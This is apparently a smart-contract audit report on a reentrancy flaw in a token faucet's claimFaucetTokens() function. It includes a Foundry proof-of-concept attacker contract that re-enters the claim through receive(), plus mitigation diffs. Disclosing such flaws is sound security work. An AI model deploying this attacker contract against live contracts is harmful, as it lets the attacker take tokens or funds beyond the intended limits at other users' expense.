# Reentrancy `claimFaucetTokens()`

## Summary

The `claimFaucetTokens()` function is vulnerable to reentrancy attacks allowing multiple token claims due to cooldown state updates after external call.

## Description

### Normal Behavior

- Users can claim tokens once every 3 days (cooldown period)

- First-time claimers receive both tokens and ETH

### Issue

The contract updates cooldown state after external calls, enabling reentrancy during ETH transfers:

```solidity
function claimFaucetTokens() public {
    //...
    if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
        //...
        if (dailyDrips + sepEthAmountToDrip <= dailySepEthCap && address(this).balance >= sepEthAmountToDrip) {
            //...
            (bool success,) = faucetClaimer.call{value: sepEthAmountToDrip}("");
            //...
        }
    //...
    //Effects
    lastClaimTime[faucetClaimer] = block.timestamp;
    dailyClaimCount++;
    //...
}
```

## Risk

### Impact

**Medium**

- Attackers can bypass the 3-day cooldown mechanism

- Unfair advantage over legitimate users

- Token distribution occurs faster than intended

### Likelihood

**High**

- Only requires deploying a contract with malicious `receive()` function

- No special timing or chain conditions needed

- Deterministic exploit that works every time

- Only applies to first-time ETH claimers (limited scope)

## Proof of Concept

### Textual PoC

1. Attacker deploys malicious contract with `receive()` function
2. Attacker calls `claimFaucetTokens()` (first time, eligible for ETH)
3. Contract sends ETH to attacker's contract via `call("")`
4. Attacker's `receive()` re-enters `claimFaucetTokens()`
5. Since `lastClaimTime` hasn't been updated yet, cooldown check passes
6. Attacker receives tokens again without waiting 3-day cooldown

### Coded PoC

```Solidity
function testReentrancyAttack() public {
    vm.startPrank(user1);

    ReentrancyAttacker attacker = new ReentrancyAttacker();
    attacker.attack(raiseBoxFaucet);
    assertEq(raiseBoxFaucet.balanceOf(user1), raiseBoxFaucet.faucetDrip() * 2);

    vm.stopPrank();
}

contract ReentrancyAttacker {
    function attack(RaiseBoxFaucet raiseBoxFaucet_) public {
        raiseBoxFaucet_.claimFaucetTokens();
        raiseBoxFaucet_.transfer(msg.sender, raiseBoxFaucet_.balanceOf(address(this)));
    }

    receive() external payable {
        RaiseBoxFaucet raiseBoxFaucet = RaiseBoxFaucet(payable(msg.sender));
        if (raiseBoxFaucet.getUserLastClaimTime(address(this)) + 3 days <= block.timestamp) {
            raiseBoxFaucet.claimFaucetTokens();
        }
    }
}
```

**Reentrancy.t.sol**: <https://github.com/Luu-Duc-Toan/2025-10-raisebox-faucet/blob/main/test/Reentrancy.t.sol>

## Recommended Mitigation

1. Move cooldown state updates before external calls:

```diff
function claimFaucetTokens() public {
    //...
+   // Effects
+   lastClaimTime[faucetClaimer] = block.timestamp;
+   dailyClaimCount++;

    if (!hasClaimedEth[faucetClaimer] && !sepEthDripsPaused) {
        // ...
        if (dailyDrips + sepEthAmountToDrip <= dailySepEthCap && address(this).balance >= sepEthAmountToDrip) {
            //...
            // Interactions
            (bool success,) = faucetClaimer.call{value: sepEthAmountToDrip}("");
            //...
        }
    }
-   // Effects
-   lastClaimTime[faucetClaimer] = block.timestamp;
-   dailyClaimCount++;
    //...
}
```

1. Add OpenZeppelin's ReentrancyGuard:

```diff
+ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

- contract RaiseBoxFaucet is ERC20, Ownable {
+ contract RaiseBoxFaucet is ERC20, Ownable, ReentrancyGuard {
    function claimFaucetTokens() public nonReentrant {
        //...
    }
}
```
